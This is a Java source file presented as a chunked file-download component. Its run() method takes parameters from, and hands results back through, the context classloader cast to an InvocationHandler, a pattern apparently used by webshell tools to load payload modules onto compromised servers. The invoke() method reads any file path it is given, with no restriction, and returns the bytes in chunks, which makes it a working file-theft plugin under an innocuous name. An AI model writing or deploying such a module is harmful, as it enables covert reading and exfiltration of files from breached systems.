package org.leo.core.component;

import java.io.File;
import java.io.RandomAccessFile;
import java.util.Arrays;
import java.util.HashMap;

/**
 * 文件下载组件
 * 提供高性能文件分块下载功能，兼容Java 6+
 *
 * @author LeoSpring
 * @version 2.2
 */
public class FileDownloadComponent implements Runnable {

    private static final int MAX_CHUNK_SIZE = 1048576;

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (HashMap) h.invoke(null, null, null);
            results = new HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new HashMap();
            setResult(500, t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    public void invoke() throws Exception {
        String path = getStringParam("path");
        long size = getLongParam("size", 0L);
        long offset = getLongParam("offset", 0L);

        if (path == null || path.length() == 0) {
            throw new IllegalArgumentException("path 不能为空");
        }
        if (size <= 0L) {
            throw new IllegalArgumentException("size 必须大于 0");
        }
        if (offset < 0L) {
            throw new IllegalArgumentException("offset 不能为负数");
        }

        File downloadFile = new File(path);
        if (!downloadFile.exists()) {
            setResult(404, "文件不存在: " + path);
            return;
        }

        if (!downloadFile.canRead()) {
            setResult(403, "文件无读取权限: " + path);
            return;
        }
        if (!downloadFile.isFile()) {
            setResult(400, "path 不是普通文件: " + path);
            return;
        }
        RandomAccessFile inputFile = null;

        try {
            inputFile = new RandomAccessFile(downloadFile, "r");

            long fileLength = inputFile.length();
            if (fileLength == 0 && offset == 0) {
                putChunkResult(new byte[0], fileLength, offset);
                return;
            }

            inputFile.seek(offset);

            long availableSize = fileLength - offset;
            if (availableSize <= 0) {
                setResult(416, "请求范围不满足: offset=" + offset + ", fileSize=" + fileLength);
                return;
            }

            int readSize = (int) Math.min(Math.min(size, availableSize), (long) MAX_CHUNK_SIZE);

            byte[] buffer = new byte[readSize];
            int totalRead = readChunk(inputFile, buffer);

            if (totalRead < readSize) {
                buffer = Arrays.copyOf(buffer, totalRead);
            }

            putChunkResult(buffer, fileLength, offset);
        } finally {
            closeQuietly(inputFile);
        }
    }

    private void putChunkResult(byte[] data, long fileLength, long offset) {
        long nextOffset = offset + data.length;
        boolean complete = nextOffset >= fileLength;
        results.put("code", complete ? 200 : 100);
        results.put("length", fileLength);
        results.put("data", data);
        results.put("bytesRead", data.length);
        results.put("offset", offset);
        results.put("nextOffset", nextOffset);
        results.put("isComplete", complete);
    }

    private int readChunk(RandomAccessFile file, byte[] buffer) throws Exception {
        int totalRead = 0;
        while (totalRead < buffer.length) {
            int bytesRead = file.read(buffer, totalRead, buffer.length - totalRead);
            if (bytesRead <= 0) break;
            totalRead += bytesRead;
        }
        return totalRead;
    }

    private String getStringParam(String key) throws Exception {
        Object value = params.get(key);
        if (value == null) return null;
        if (value instanceof byte[]) return new String((byte[]) value, "UTF-8");
        return String.valueOf(value);
    }

    private long getLongParam(String key, long defaultValue) throws Exception {
        Object value = params.get(key);
        if (value == null) return defaultValue;
        if (value instanceof Number) return ((Number) value).longValue();

        String text = getStringParam(key);
        try {
            return Long.parseLong(text.trim());
        } catch (NumberFormatException e) {
            throw new IllegalArgumentException(key + " 必须是整数: " + text);
        }
    }

    private void setResult(int code, String message) {
        results.put("code", Integer.valueOf(code));
        results.put("msg", message);
    }

    private void closeQuietly(java.io.Closeable resource) {
        if (resource == null) return;
        try { resource.close(); } catch (Exception ignored) {}
    }
}
